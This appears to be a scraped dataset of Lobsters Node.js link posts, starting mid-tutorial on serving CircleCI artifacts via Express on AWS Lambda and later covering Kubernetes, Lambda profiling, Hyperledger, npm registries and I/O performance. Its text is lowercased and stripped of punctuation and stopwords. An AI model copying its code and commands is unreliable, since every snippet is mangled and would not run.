corresponding url circleci api endpoint list latest artifact fetch listing artifact circleci api loop artifact return redirect corresponding url path match return filenotfound error artifact match provided path implementation might look something like const http require http const express require express const app express appget artifact username project req re mandatory positional argument const file reqparams const project username reqparams optional query string parameter const branch reqquerybranch master const build reqquerybuild latest const filter reqqueryfilter successful const vcstype reqqueryvcstype github construct request option hitting circleci api const requestoptions hostname circlecicom path vcstype username project build artifact branch branch filter filter port method get header accept applicationjson make request httpsget requestoptions response accumulate response body let body responsesetencoding responseon data data body data process complete response responseon end try loop try find specified artifact const artifact jsonparse body let artifactslength const artifact artifact artifactpath file redirect artifact url find return resredirect artifacturl return matching artifact return resstatus send found catch e consoleerror e return resstatus send something went wrong emessage run app file run script moduleparent applisten consolelog listening port export app use lambda moduleexports app saving file called appjs installing express yarn add express able run service machine node appjs app listen port test running following l location flag tell curl follow redirects curl l http localhostartifactsintoliexoduscoveragereporttotalcoveragejson everything working correctly output something like following coverage need turn lambda function deploy expose api lambdifying express app might noticed appjs checked moduleparent calling applisten done local server could run executing node appjs configured app object could also imported another file without app listening automatically lambda function work exposing handler function invoked event context data instead making app listen port need make capable processing provided event context object aws lab project called awsserverlessexpress make easy adapt express app work lambda function installed running yarn add awsserverlessexpress simply need make file called lambdajs following content const awsserverlessexpress require awsserverlessexpress const app require app const server awsserverlessexpresscreateserver app exportshandler event context awsserverlessexpressproxy server event context export handler function allow u use express app lambda function creating aws role policy actually create lambda function need create role lambda function api gateway able assume create new file called circleciartifactsrolepolicydocumentjson following content version statement effect allow principal service apigatewayamazonawscom lambdaamazonawscom action sts assumerole create role createrole running following store json response variable response aws iam createrole rolename circleciartifactsrole assumerolepolicydocument file circleciartifactsrolepolicydocumentjson echo response terminal echo response store role arn future usage rolearn jq r rolearn response note storing response environment variable using jq extract particular value json response case role amazon resource namearn allow u use variable substitution value later command instead add manually argument full response also echoed terminal see normal command output worry extracting anything beyond grab jq use pattern future command well code echo full json response look something like role path rolename circleciartifactsrole roleid arn arn aws iam rolecircleciartifactsrole createdate assumerolepolicydocument version statement effect allow principal service apigatewayamazonawscom lambdaamazonawscom action sts assumerole need attach policy role grant necessary permission first create another json file called circleciartifactspolicyjson following content version statement effect allow action apigateway resource arn aws apigateway effect allow action executeapi invoke resource arn aws executeapi effect allow action lambda resource policy little liberal side come back restrict resource know specific arns attach policy use putrolepolicy aws iam putrolepolicy rolename circleciartifactsrole policyname circleciartifactspolicy policydocument file circleciartifactspolicyjson command output anything grant iam role permission necessary lambda function api gateway function went well able browse aws iam console see circleciartifactsrole role tab content circleciartifactspolicyjson listed inline policy actual configuration via aws commandline interface convenient doublecheck thing configured web interface creating lambda function need first package lambda function zip file uploading done invoking zip command following option zip r circleciartifactszip appjs lambdajs nodemodules packagejson note including appjs file includes actual service implementation lambdajs function export lambda handler nodemodules includes dependency create new lambda function called circleciartifactsfunction use createfunction need specify zip file included role arn stored earlier function name node runtime fact handler exposed handler lambdajs file store json response variable response aws lambda createfunction functionname circleciartifactsfunction zipfile fileb circleciartifactszip handler lambdahandler runtime role rolearn echo response terminal echo response store function arn future usage functionarn jq r functionarn response echo response similar following also saving lambda function arn functionarn environment variable functionname circleciartifactsfunction functionarn arn aws lambda function circleciartifactsfunction runtime role arn aws iam rolecircleciartifactsrole handler lambdahandler codesize description timeout memorysize lastmodified version latest tracingconfig mode passthrough need make change function implementation future upload new zip file using updatefunctioncode aws lambda updatefunctioncode zipfile fileb circleciartifactszip functionname circleciartifactsfunction also view modify setting lambda function visiting aws lambda console show overview lambda function click browse code reconfigure etc integrate function api gateway packaged original express app lambda function use awsserverlessexpress library translate lambda function handler invocation something api endpoint could understand sort opposite expose lambda function http endpoint use api gateway translate api request lambda function invocation lambdahandler handler understand need first create new api api gateway using createrestapi command store json response variable response aws apigateway createrestapi name circleciartifactsapi endpointconfiguration typesregional echo response terminal echo response store api id future usage apiid jq r id response running command output something similar following store rest api id apiid id name circleciartifactsapi createddate apikeysource header endpointconfiguration type regional create api root resource created automatically need id resource order make new child resource make query getresources find id store json response variable response aws apigateway getresources restapiid apiid echo response terminal echo response store root resource id future usage rootresourceid jq r item id response output something similar following id stored rootresourceid item id path next need create child resource integrate lambda function using createresource particular note specify path segment resource proxy proxy defines greedy path variable awsserverlessexpress expect present event passed handler match call api proxy path extracted awsserverlessexpress actual routing ultimately handled little express app would running locally store json response variable response aws apigateway createresource restapiid apiid parentid rootresourceid pathpart proxy echo response terminal echo response store proxy resource id future usage proxyresourceid jq r id response persist new proxy resource id print something similar id parentid pathpart proxy path proxy need explicitly allow get method api resource using putmethod also specify authorization required use method aws apigateway putmethod restapiid apiid resourceid proxyresourceid httpmethod get authorizationtype none command output something similar following confirming method added httpmethod get authorizationtype none apikeyrequired false need integrate resource lambda function using putintegration aws apigateway putintegration restapiid apiid resourceid proxyresourceid httpmethod get integrationhttpmethod post type awsproxy uri arn aws apigateway lambda functionarn invocation credential rolearn output something similar following type awsproxy httpmethod post uri arn aws apigateway lambda aws lambda function circleciartifactsfunctioninvocations credential arn aws iam rolecircleciartifactsrole passthroughbehavior whennomatch timeoutinmillis cachenamespace cachekeyparameters finally actually deploy api createdeployment need specify stage name namespace api chose could anything want aws apigateway createdeployment restapiid apiid stagename running output something similar following need store deployment id indicate stage name later id createddate service check status configuration visiting aws api gateway console page allows u see proxy path indeed configured invoke circleciartifactsfunction aws lambda point microservice available via api gateway deployment default url gateway deployment follows following pattern http restapiid executeapi region amazonawscom stage rest api id region stage mean able run command like curl l http access latest version coveragereporttotalcoveragejson resource gone well far see output similar coverage well good would nice could host plan provide free public service creating domain certificate first step towards providing api custom domain request validate ssltls certificate domain aws certificate manager api gateway notably support http either creating uploading certificate mandatory couple way confirm ownership domain one easier one dns validation specify validation method request certificate requestcertificate store json response variable response aws acm requestcertificate domainname circleciintolicom validationmethod dns idempotencytoken echo response terminal echo response store certificate id future usage certificatearn jq r certificatearn response return certificate arn also need dns validation information certificatearn arn aws acm access information using describecertificate request additional information certificate created aws acm describecertificate certificatearn certificatearn echo something similar following certificate certificatearn arn aws acm domainname circleciintolicom subjectalternativenames circleciintolicom domainvalidationoptions domainname circleciintolicom validationstatus pendingvalidation resourcerecord name type cname value validationmethod dns subject cncircleciintolicom createdat status pendingvalidation keyalgorithm signaturealgorithm inuseby type amazonissued keyusages extendedkeyusages import part bit nested certifactedomainvalidationoptionsresourcerecord type key indicates need create cname record domain confirm ownership name value indicate detail record exact detail create cname record vary depending domain registrar use relatively straightforward dns setting page domain shortly creating record amazon confirm ownership certificate validated happens value certificatestatus previous query switch pendingvalidation issued status also checked aws acm console page see large success message domain status certificate issued exposing api domain name finally associate api circleciintolicom domain name specify arn certificate created domain createdomainname aws apigateway createdomainname domainname circleciintolicom endpointconfiguration typesregional regionalcertificatearn certificatearn running output something similar following domainname circleciintolicom certificateuploaddate regionaldomainname regionalhostedzoneid regionalcertificatearn arn aws acm endpointconfiguration type regional regionaldomainname key included response domain need point domain using cname record detail depend domain provider fairly straightforward need create mapping path domain api using createbasepathmapping leave actual basepath option signify want map root domain api specific stage deployment aws apigateway createbasepathmapping domainname circleciintolicom restapiid apiid stage echo response along line confirming option specified applied basepath none restapiid stage everything place point confirm visiting api gateway console navigating custom domain name tab custom domain displayed see properly linked acm certificate mapped stage api look good able access api using circleciintolicom domain running curl l http circleciintolicomartifactsintoliexoduscoveragereporttotalcoveragejson confirm indeed see expected output coverage using api make coverage badge made far article continuous integration aws lambda maybe maybe seen row badge like chance seen commonly placed readme file open source project act little statusdashboard project make easy somebody browsing repository get date build information project look snazzy boot one popular provider type badge shieldsio number builtin circleci build also allow dynamically create badge using data remote json file field extract dynamic badge specified using jsonpath actually quite similar jq command used extract field aws json response syntax unfortunately little different jq would extract value toplevel coverage key coverage equivalent query jsonpath would coverage needed specify root object using proxy built tutorial construct one dynamic coverage badge automatically display latest test coverage base url dynamic badge http imgshieldsiobadgedynamicjsonsvg specify handful query string parameter parameter need urihttps circleciintolicomartifactsintoliexoduscoveragereporttotalcoveragejson url json fetched query coverage extract value toplevel coverage key fetched json labelcoverage text show left side badge background color prefix prefix displayed value required argument even blank suffix suffix displayed value also required smooshing together src img tag allows u finally construct nice html coverage badge also wrap image link http circleciintolicomartifactsintoliexoduscoveragereportindexhtml see latest full coverage report href http circleciintolicomartifactsintoliexoduscoveragereportindexhtml img src http imgshieldsiobadgedynamicjsonsvg labelcoverage prefix suffix query coverage urihttps circleciintolicomartifactsintoliexoduscoveragereporttotalcoveragejson alt coverage code placed project readme github render like done even personally make use api developed hope found stepbystep instruction building expressbased microservice aws lambda useful many serverless framework include highlevel deployment command personally like know exactly resource provisioned explicit control process bit searching around guide picking seemed pretty slim came setting thing regard using aws commandline tool instead web console found article useful please keep intoli mind future consulting contracting need backend frontend infrastructure web scraping machine learning data analysis whatever else float boat buying selling
224,Lobsters,nodejs,Node.js programming,Debugging Node without restarting processes,https://hackernoon.com/debugging-node-without-restarting-processes-bd5d5c98f200,debugging node without restarting process,,
225,Lobsters,nodejs,Node.js programming,Kubernetes deployment explorer with a face,https://github.com/codefresh-io/zenkube,kubernetes deployment explorer face,zenkube description robohash run within cluster command line argument,zenkube deployment face history get know description zenkube easy deploy utility log monitor deployment cluster provides friendly way keep track deployment assigning synthesized unique hash every new deployment revision gitesque style every deployment symbolized robohash quick identification run within cluster use kubectl deploy zenkube image codefreshzenkube kubectl run zenkube imagecodefreshzenkube kubectl portforward kubectl get pod template index item metadataname selectorrunzenkube command line argument incluster flag set zenkube connect api using configuration obtained container environment var flag omitted zenkube look local configuration kubeconfig context context selects configuration context work incluster set simply use browser open http prepared personally meet deployment first time feel excitement
226,Lobsters,nodejs,Node.js programming,Using IOpipe profiling to gain crucial observability into your AWS Lambda functions,https://read.iopipe.com/using-iopipe-profiling-to-gain-crucial-observability-into-your-aws-lambda-functions-506f5dda6bdf,using iopipe profiling gain crucial observability aws lambda function,including configuring iopipe profiling plugin including profiling plugin activate viewing iopipe profiling data cpu usage invocation flame chart call stack thing keep mind iopipe profiling like cpu profiling effect performance right profiling supported nodejs moment beta customer paid iopipe plan sign community slack channel,super excited dig newest feature tool give better glimpse serverless function like one sure make user life easier increased ease experience deployment operation serverless quickly paired tradeoff lose transparency hard get visibility back new profiling feature important able see cpu profiling data lambda function time iteration key ability diagnose problem identify solution quicklyknowing aws lambda function cpu usage critical diagnosing problem scaling cost also factor profiling data show need push pull cpu allocation function help save money show aws lambda application need scaleour new feature allows see cpu profiling entire aws lambda code base adding line code function iopipe dashboard see download link file loaded chrome devtools present flame graph representing cpu statistic label set glance able determine part aws lambda function take time cpua look profiling data iopipelet take look implementation use profiling best way know diving code including configuring iopipe profiling pluginin order include iopipe profiling plugin nodejs aws lambda function need require iopipeprofiler order module loaded tell main iopipe library wish use plugin configuration look lot like configuration option profiling plugin enabled including profiling plugin activate need set true order receive profiling data aws lambda application also configure environment variable iopipeenableprofilingtruesamplerate finetune number sample taken application default fairly granular usdebug option give ability see debug log case want see data profiler run set false defaultonce included configured profiling plugin run start see iopipe profiling data right away well kind start see download link invocation let walk opening deciphering data viewing iopipe profiling datayou see download link profiling data setting plugin order view data need open chrome devtools javascript profiler tab see click three vertical dot upper right corner tool import file clicking load finding cpuprofile file downloadedonce done see flame chart breakdown everything lambda function via cpu stack trace lot process let break basic data getwhat iopipe profiling data tell aws lambda functionscpu usage invocation handy chart show spike cpu usage aws lambda function giving overview resource utilization function invocation timeflame chart show executing aws lambda function great diagnosing everything error moving pinning race condition call stack even drill call stack see exactly called sorry profiling technology still tell need see exactly going instant place even select tree view go topdown heavy go take bottomup approachthings keep mindiopipe profiling like cpu profiling effect performance highly recommend use application strictly developmentcycle tool forego running productionside aws lambda functionsright profiling supported nodejs make sure keep updated add functionality language moment beta customer paid iopipe plan announcing information rollout move forwardif like try iopipe got free trial commitment sign want connect team participate feedback session general question peep u community slack super excited adding feature debugging aws lambda function get tricky happy bring tool bring clarity perspective development process keep eye future development
227,Lobsters,nodejs,Node.js programming,How to build NodeJS application for your Hyperledger Composer networks,https://www.skcript.com/svr/how-to-build-nodejs-application-for-your-hyperledger-composer-networks/,build nodejs application hyperledger composer network,prerequisite getting started step creating project folder installing dependency step basic boilerplate express server expressfileupload cors bodyparser step build model class demo login ping,article explain create login card file ping logout flow nodejs sdk future article explain create asset submit transaction thingsprerequisite getting article please make sure basic understanding following javascript oop conceptsjavascript promiseserver routing http methodsexpressjsgetting started building server application expressjs use library interact fabric network create basic express app following stepsstep creating project folder installing dependenciescreate folder system install expressjs node module npmmkdir myapp cd myapp touch indexjs npm install express composeradmin composerclient composercommon save indexjs packagejson file nodemodules folder inside myapp folderstep basic boilerplate express serverlet create endpoint login ping logout everything http post methodconst express require express const app express apppost apilogin function req re apppost apiping function req re apppost apilogout function req re using following list express middlewares mentioned operationsexpressfileupload handling fileuploadscors cross domain api supportbodyparser parsing payload sent body http requestsnpm install expressfileupload cors bodyparser middlewares imported used follows const fileupload require expressfileupload var cors require cors var bodyparser require bodyparser appuse bodyparserjson appuse fileupload appuse cors origin credential true replaces allowed domain origin array cors middleware configurationstep build model classmodel class javascript class holding network related operation function creating object instance class call function intended perform defined operationscreate file libmynetworkjs considering mynetwork name network import following librariesconst businessnetworkconnection require composerclient businessnetworkconnection const idcard require composercommon idcard const filesystemcardstore require composercommon filesystemcardstore const businessnetworkcardstore require composercommon businessnetworkcardstore const adminconnection require composeradmin adminconnection businessnetworkconnection used create connection instance used communicate network authorised identity idcard used handle uploaded card file extract info certificate filesystemcardstore defines type card store businessnetworkcardstore parent class businessnetworkcardstore used admin connection adminconnection responsible handling card import export issue revoke identity admin related actionsin order perform action creating instance imported classesvar filesystemcardstore new filesystemcardstore var businessnetworkcardstore new businessnetworkcardstore var adminconnection new adminconnection let create class called mynetwork constructor itclass mynetwork constructor cardname thiscurrentparticipantid thiscardname cardname thisconnection new businessnetworkconnection three instance variable created currentparticipantid hold participant current authorized user cardname used hold uploaded card name connection connection object communicate networkas first step need create static function help import card composer network check ca verifies static importcardtonetwork carddata var idcarddata idcardname var businessnetworkconnection new businessnetworkconnection return idcardfromarchive carddata function idcarddata idcarddata idcarddata return businessnetworkcardstoregetdefaultcardname idcarddata function idcardname idcardname idcardname return filesystemcardstoreput idcardname idcarddata function result return adminconnectionimportcard idcardname idcarddata function imported imported return businessnetworkconnectionconnect idcardname else return null function businessnetworkdefinition businessnetworkdefinition return null return idcardname function sending card data first get name card put card store putting card store check ca verifies authenticity card putting card importing card admin connection everything done successfully card name returned else catch block calledhere either need create session card name store db access token send access token client session handling tutorial saving simply text sending header successive request strongly recommend follow way production applicationnow indexjs file import mynetwork class update login route followsconst mynetwork require libmynetwork apppost apilogin function req re mynetworkimportcardtonetwork reqfilescarddata function idcardname idcardname resstatus json message logging failed resjson message logging successful accesstoken idcardname catch function error resstatus json message login failed error errortostring let consider accesstoken card name passed header authorization retrieved reqheadersauthorizationnext update route ping ping network get id card informationapppost apiping function req re var cardname reqheadersauthorization var mynetwork new mynetwork cardname mynetworkinit function return mynetworkping function userinfo resjson user userinfo catch function error resstatus json error errortostring init function mynetwork class called everytime want perform action network take card name connect network card performed connection object updated authorized person information thus making future call authorizedinit var return thisconnectionconnect thiscardname result thisbusinessnetworkdefinition result thisserializer thisbusinessnetworkdefinitiongetserializer ping function call ping function connection check current participant attached connection objectping var return thisconnectionping function result return result return participant used get information participantfinally logout need remove card store return statusapppost apilogout function req re var cardname reqheadersauthorization var mynetwork new mynetwork cardname mynetworkinit function return mynetworklogout function resjson message user added successfully catch function error consolelog error resstatus json error errortostring class create logout function use adminconnection delete card storelogout var return thisping function return adminconnectiondeletecard thiscardname demo let try endpoint see responseslogin create post request http attach card file name cardresponse message logging successful accesstoken varun tutorialnetwork ping post http authorization headerresponse user version participant orgtutorialuser try tell u go
229,Lobsters,nodejs,Node.js programming,packagecloud.io now supports Node.js packages!,https://blog.packagecloud.io/eng/2017/12/27/npm-registry-support/,packagecloudio support nodejs package,tl dr packagecloud cli packagecloud api scoped nodejs package yarn feature automatic proxying official npm registry npm registy npm registry every work yarn yarn package manager scoped package support scoped package documentation packagecloud cli packagecloud api easy use ssl authentication private npm registry documentation installation instruction served via fastly cdn uploading nodejs package packagecloud cli api using npm publish cli packagecloud cli browser conclusion,tl drwe thrilled announce upload nodejs package packagecloud repository upload using npm publish packagecloud cli packagecloud apithe npm registry support added packagecloud includes support scoped nodejs package yarn package manager right box additional configuration needed featuresautomatic proxying official npm registrywhen install package using npm install npm program automatically attempt install dependency required package dependency found packagecloud repository packagecloud automatically forward request missing dependency official npm registy way upload main package worry also uploading dependenciesif would like install nodejs package dependency packagecloud repository without relying official npm registry disable automatic proxying changing toggle found repository settingsnote disable setting need upload every dependency every package upload packagecloud repository npm install fail user want leave setting enabled default setup npm registry freeworks yarnusing popular yarn package manager problem work box without extra configuration yarn add packagecloud package supportnodejs package namespaced adding known scope package name allows easily create namespace package grouped togetheryou learn feature npm reading scoped package documentation available npm websiteworking scoped nodejs package using packagecloud simple use npm publish packagecloud cli packagecloud api normally would packagecloud detect properly handle scoped package automaticallyyou install scoped package repository normally would using npm install commandfor example install scoped package julioexpress version would run npm install julioexpress usejust like java rpm debian rubygem python support automatically infer necessary metadata right uploaded nodejs package manual data entry needed ssl authentication private npm registriespackagecloud support http plain text http support whatsoeveryou create public private repository packagecloud storing debian rpm rubygem java nodejs packagesaccess repository controlled issuing read access token read token authentication system documentationinstallation instructionsyour customer colleague easily install package using npm yarn repository using installation script simple instructionsserved via fastly cdnall nodejs package registry metadata hosted amazon served via fastly super fast global cdnuploading nodejs packagesyou upload nodejs package public private packagecloud repository using npm publish packagecloud cli apiusing npm publishno need learn new workflow use npm publish always npm config set registry http packagecloudiojuliotestingnpm npm login npm publishfrom cliyou need update packagecloud cli version newer upload delete nodejs package command lineto upload npm package run push like packagecloud push juliotestingnode browseryou also upload release package web browser clicking add package repository pageconclusionpackagecloud full support nodejs package act public private npm registry use npm cli update latest cli newer start uploading nodejs package today
230,Lobsters,nodejs,Node.js programming,I wrote a BrainF*ck interpreter in JS (can be minified to 417 bytes),https://gist.github.com/maxpert/cbdc82acee1a38e78653ef1a775cc547,wrote brainf ck interpreter j minified byte,j brainfuck reload reload,instantly share code note snippet minimal brainf ck implementation j j brainfuck primary reason implementation better readability minimal implementation single function implementation iterative approach compressable small size byte copyright zohaib sibte hassan permission hereby granted free charge person obtaining copy software associated documentation file software deal software without restriction including without limitation right use copy modify merge publish distribute sublicense andor sell copy software permit person software furnished subject following condition copyright notice permission notice shall included copy substantial portion software software provided without warranty kind express implied including limited warranty merchantability fitness particular purpose noninfringement event shall author copyright holder liable claim damage liability whether action contract tort otherwise arising connection software use dealing software fmb f k brain in instruction string oup terminal output callback function inp terminal input callback function function fmb in oup inp var dp ip il inslength scp op mdp ip il ip op in ip op mpush ip op scp ip mpop scp scp ip ip ip ip il op in ip dp op op mdp dp mdp op inp inp mdp mdp mdp mdp op op ip op mdp scp ip op scp ip ip op oup oup mdp dp mdp return dp function fmb r f n var p hrlength e h e e tpush e e tpop e e h pt u e p n n p e p e e f f p u p return u var code var output fmb code function v output stringfromcharcode v consolelog output perform action time signed another tab window reload refresh session signed another tab window reload refresh session
231,Lobsters,nodejs,Node.js programming,"OSHUG Event #63 - Collaborative music making, ultra-low latency audio and sensor processing",http://oshug.org/event/63,oshug event collaborative music making ultralow latency audio sensor processing,bela embedded platform ultralow latency audio sensor processing bela giulio moro female laptop orchestra exploring geographical cultural technical artistic challenge collaborative music making female laptop orchestra nela brown talk tba note please aim arrive event start prompt closing date booking tuesday january pm booking taken date overseas delegate wish attend event please note bcs issue invitation letter,start new year event theme open source musical software hardware bela embedded platform ultralow latency audio sensor processing bela started research project centre digital music queen mary university london commercial product mainly aimed maker programmer researcher work audio platform based beaglebone black custom expansion cape dedicated software environment board run debian linux xenomai realtime cokernel combined use xenomai beaglebone black onboard pru microcontroller allows achieve submillisecond latency audio sensor processing nodejs used provide userfriendly webbased ide project entirely open source hardware software giulio moro phd student centre digital music queen mary university london sound engineer training researching field performerinstrument interaction one inventor core developer bela female laptop orchestra exploring geographical cultural technical artistic challenge collaborative music making collective female musician artist engineer computer scientist researcher female laptop orchestra pushing boundary technology crosscultural colocated distributed collaborative music making since besides musical instrument use variety open source commercial tool create music stream music connect audience performance often collaborate classical composer ensemble filmmaker visual designer choreographer dancer recently also collaborated member woman music technology student organization whose goal encouraging woman join music tech field study highlight often unsung role woman music technology based georgia tech centre music technology u sonora collaborative network bringing together artist researcher interested feminist manifestation context art based brazil nela brown sound artist technologist researcher educator past decade composed music designed sound awardwinning project including theatre performance dance mobile film documentary interactive installation founder female laptop orchestra flo eclectic group female musician technologist exploring colocated distributed collaborative music making within different context across different geographical location creative director flo since nela coordinated national international flo performance involving collaborator different country talk tba note please aim arrive event start prompt closing date booking tuesday january pm booking taken date overseas delegate wish attend event please note bcs issue invitation letter
232,Lobsters,nodejs,Node.js programming,Server-side I/O Performance: Node vs. PHP vs. Java vs. Go,https://www.toptal.com/back-end/server-side-io-performance-node-php-java-go,serverside io performance node v php v java v go,io basic quick refresher system call blocking v nonblocking call scheduling keep simple approach php converse multithreaded approach java nonblocking io first class citizen node naturally nonblocking go lie damned lie benchmark benchmark note clearly go winner followed java node finally php summary implementation nonblocking io available use web application,understanding inputoutput io model application mean difference application deal load subjected one crumples face realworld use case perhaps application small serve high load may matter far le application traffic load increase working wrong io model get world hurt like situation multiple approach possible matter one better matter understanding tradeoff let take walk across io landscape see spy article comparing node java go php apache discussing different language model io advantage disadvantage model conclude rudimentary benchmark concerned io performance next web application article io basic quick refresher understand factor involved io must first review concept operating system level unlikely deal many concept directly deal indirectly application runtime environment time detail matter system call firstly system call described follows program user land say must ask operating system kernel perform io operation behalf syscall mean program asks kernel something specific implemented vary os basic concept going specific instruction transfer control program kernel like function call special sauce specifically dealing situation generally speaking syscalls blocking meaning program wait kernel return back code kernel performs underlying io operation physical device question disk network card etc reply syscall real world kernel might number thing fulfill request including waiting device ready updating internal state etc application developer care kernel job blocking v nonblocking call said syscalls blocking true general sense however call categorized nonblocking mean kernel take request put queue buffer somewhere immediately return without waiting actual io occur block brief time period long enough enqueue request example linux syscalls might help clarify read blocking call pas handle saying file buffer deliver data read call return data note advantage nice simple epollcreate epollctl epollwait call respectively let create group handle listen addremove handler group block activity allows efficiently control large number io operation single thread getting ahead great need functionality see certainly complex use important understand order magnitude difference timing cpu core running without getting optimization cpu performing billion cycle per second cycle per nanosecond nonblocking system call might take order cycle complete relatively nanosecond call block information received network might take much longer time let say example millisecond second let say example nonblocking call took nanosecond blocking call took nanosecond process waited million time longer blocking call kernel provides mean blocking io read network connection give data nonblocking io tell network connection new data mechanism used block calling process dramatically different length time scheduling third thing critical follow happens lot thread process start blocking purpose huge difference thread process real life noticeable performancerelated difference since thread share memory process memory space making separate process tends take lot memory talking scheduling really boil list thing thread process alike need get slice execution time available cpu core thread running core run divide time one get share core running short period time moving onto next thread done context switch making cpu switch running one threadprocess next context switch cost associated take time fast case may le nanosecond uncommon take nanosecond longer depending implementation detail processor speedarchitecture cpu cache etc thread process context switching talking thousand thread hundred nanosecond thing get slow however nonblocking call essence tell kernel call new data event one connection nonblocking call designed efficiently handle large io load reduce context switching far come fun part let look popular language tool draw conclusion tradeoff ease use interesting tidbit note example shown article trivial partial relevant bit shown database access external caching system memcache et anything requires io going end performing sort io call hood effect simple example shown also scenario io described blocking php java http request response read writes blocking call io hidden system attendant performance issue take account lot factor go choosing programming language project even lot factor consider performance concerned program constrained primarily io io performance make break project thing need know keep simple approach php back lot people wearing converse shoe writing cgi script perl php came along much people like rag made making dynamic web page much easier model php us fairly simple variation average php server look like http request come user browser hit apache web server apache creates separate process request optimization reuse order minimize many creating process relatively speaking slow apache call php tell run appropriate php file disk php code executes blocking io call call filegetcontents php hood make read syscalls wait result course actual code simply embedded right page operation blocking php blocking file io filedata filegetcontents pathtofiledat blocking network io curl curlinit http examplecomexamplemicroservice result curlexec curl blocking network io result db query select id data example order id desc limit term integrates system like pretty simple one process per request io call block advantage simple work disadvantage hit client concurrently server burst flame approach scale well tool provided kernel dealing high volume io epoll etc used add insult injury running separate process request tends use lot system resource especially memory often first thing run scenario like note approach used ruby similar php broad general handwavy way considered purpose multithreaded approach java java come along right time bought first domain name cool randomly say dot com sentence java multithreading built language especially created pretty awesome java web server work starting new thread execution request come thread eventually calling function application developer wrote io java servlet tends look something like public void doget httpservletrequest request httpservletresponse response throw servletexception ioexception blocking file io inputstream fileis new fileinputstream pathtofile blocking network io urlconnection urlconnection new url http examplecomexamplemicroservice openconnection inputstream netis urlconnectiongetinputstream blocking network io outprintln since doget method corresponds one request run thread instead separate process request requires memory separate thread nice perk like able share state cached data etc thread access memory impact interacts schedule still almost identical done php example previously request get new thread various io operation block inside thread request fully handled thread pooled minimize cost creating destroying still thousand connection mean thousand thread bad scheduler important milestone version java significant upgrade gained ability nonblocking io call application web otherwise use least available java web server try take advantage various way however vast majority deployed java application still work described java get u closer certainly good outofthebox functionality io still really solve problem happens heavily io bound application getting pounded ground many thousand blocking thread nonblocking io first class citizen node popular kid block come better io nodejs anyone even briefest introduction node told nonblocking handle io efficiently true general sense devil detail mean witchcraft achieved matter come performance essentially paradigm shift node implement instead essentially saying write code handle request instead say write code start handling request time need something involves io make request give callback function node call done typical node code io operation request go like httpcreateserver function request response fsreadfile pathtofile function err data responseend data see two callback function first get called request start second get called file data available basically give node opportunity efficiently handle io callback scenario would even relevant database call node bother example exact principle start database call give node callback function performs io operation separately using nonblocking call invokes callback function data asked available mechanism queuing io call letting node handle getting callback called event loop work pretty well however catch model hood reason lot javascript engine chrome j engine used node implemented anything else j code write run single thread think moment mean io performed using efficient nonblocking technique j cpubound operation run single thread chunk code blocking next common example might come looping database record process way outputting client example show work var handler function request response connectionquery select function err row err throw err var rowslength processing row responseend write result node handle io efficiently loop example using cpu cycle inside one main thread mean connection loop could bring entire application crawl depending long take request must share slice time one time main thread premise whole concept based io operation slowest part thus important handle efficiently even mean processing serially true case point opinion quite tiresome writing bunch nested callback argue make code significantly harder follow uncommon see callback nested four five even level deep inside node code back tradeoff node model work well main performance problem io however achilles heel go function handling http request put cpuintensive code bring every connection crawl careful naturally nonblocking go get section go appropriate disclose go fanboy used many project openly proponent productivity advantage see work use said let look deal io one key feature go language contains scheduler instead thread execution corresponding single o thread work concept goroutines go runtime assign goroutine o thread execute suspend associated o thread based goroutine request come go http server handled separate goroutine diagram scheduler work look like hood implemented various point go runtime implement io call making request writereadconnectetc put current goroutine sleep information wake goroutine back action taken effect go runtime something terribly dissimilar node except callback mechanism built implementation io call interacts scheduler automatically also suffer restriction handler code run thread go automatically map goroutines many o thread deems appropriate based logic scheduler result code like func servehttp w httpresponsewriter r httprequest underlying network call nonblocking row err dbquery select row range row something row request goroutine wwrite write response also nonblocking see basic code structure resembles simplistic approach yet achieves nonblocking io hood case end best world nonblocking io used important thing code look like blocking thus tends simpler understand maintain interaction go scheduler o scheduler handle rest complete magic build large system worth putting time understand detail work time environment get outofthebox work scale quite well go may fault generally speaking way handle io among lie damned lie benchmark difficult give exact timing context switching involved various model could also argue le useful instead give basic benchmark compare overall http server performance server environment bear mind lot factor involved performance entire endtoend http requestresponse path number presented sample put together give basic comparison environment wrote appropriate code read file random byte ran hash n number time n specified url query string eg testphp print resulting hash hex chose simple way run benchmark consistent io controlled way increase cpu usage see benchmark note bit detail environment used first let look low concurrency example running iteration concurrent request one hash per request give u time mean number millisecond complete request across concurrent request lower better hard draw conclusion one graph seems volume connection computation seeing time general execution language much io note language considered scripting language loose typing dynamic interpretation perform slowest happens increase n still concurrent request load hash iteration significantly cpu load time mean number millisecond complete request across concurrent request lower better sudden node performance drop significantly cpuintensive operation request blocking interestingly enough php performance get much better relative others beat java test worth noting php implementation written c execution path spending lot time loop since hash iteration let try concurrent connection close could come unfortunately environment failure rate insignificant chart look total number request per second higher better total number request per second higher better picture look quite different guess look like high connection volume perconnection overhead involved spawning new process additional memory associated phpapache seems become dominant factor tank php performance clearly go winner followed java node finally php factor involved overall throughput many also vary widely application application understand gut going hood tradeoff involved better summary pretty clear language evolved solution dealing largescale application lot io evolved fair php java despite description article implementation nonblocking io available use web application common approach described attendant operational overhead maintaining server using approach would need taken account mention code must structured way work environment normal php java web application usually run without significant modification environment comparison consider significant factor affect performance well ease use get language thread v process nonblocking io ease use php process java thread available requires callback nodejs thread yes requires callback go thread goroutines yes callback needed thread generally going much memory efficient process since share memory space whereas process combining factor related nonblocking io see least factor considered move list general setup related io improves pick winner contest would certainly go even practice choosing environment build application closely connected familiarity team said environment overall productivity achieve may make sense every team dive start developing web application service node go indeed finding developer familiarity inhouse team often cited main reason use different language andor environment said time changed past fifteen year lot hopefully help paint clearer picture happening hood give idea deal realworld scalability application happy inputting outputting
